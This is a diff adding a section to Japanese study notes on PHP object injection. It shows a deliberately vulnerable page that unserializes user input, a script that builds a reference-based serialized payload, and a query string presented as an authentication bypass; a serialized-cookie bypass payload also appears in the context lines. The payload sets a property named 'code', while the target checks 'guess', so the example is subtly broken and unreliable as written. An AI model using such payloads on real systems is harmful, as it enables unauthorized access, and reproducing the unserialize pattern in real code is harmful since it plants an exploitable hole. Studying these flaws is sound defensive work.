@@ -115,6 +115,43 @@ echo gettype(true === "admin")." : ".(true === "admin")."\n"; // boolean :
 Cookie: auth=a%3A2%3A%7Bs%3A8%3A%22username%22%3Bb%3A1%3Bs%3A8%3A%22password%22%3Bb%3A1%3B%7D
 ```
 ## AuthBypass ObjectReference
+```php
+<?php
+class Object1{
+  var $guess;
+  var $secretCode;
+}
+
+$obj = unserialize($_GET['input']);
+
+if($obj) {
+    $obj->secretCode = rand(500000,999999);
+    if($obj->guess === $obj->secretCode) {
+        echo "Win";
+    }
+}
+?>
+```
+以下で`$secretCode`と`$code`が同じ値を指すように参照代入したシリアライズデータを作成する。   
+```php
+<?php
+class Object1{
+    public $secretCode = "a";
+    public $code;
+    //public $code = &$secretCode;  // ここでやろうとするとerror。コンストラクタ内でやらないとだめらしい
+    public function __construct(){
+        // リファレンス(参照)代入。これで$secretCodeと$codeが同じ値を指すようになった！
+        $this->code = &$this->secretCode;
+    }
+}
+$obj1 = new Object1();
+echo serialize($obj1);  // O:7:"Object1":2:{s:10:"secretCode";s:1:"a";s:4:"code";R:2;}
+?>
+```
+以下で認証を突破できる！   
+```txt
+?input=O:7:"Object1":2:{s:10:"secretCode";s:1:"a";s:4:"code";R:2;}
+```
 ## POP chain (SQL Injection)
 # 参考
 https://securitycafe.ro/2015/01/05/understanding-php-object-injection/   
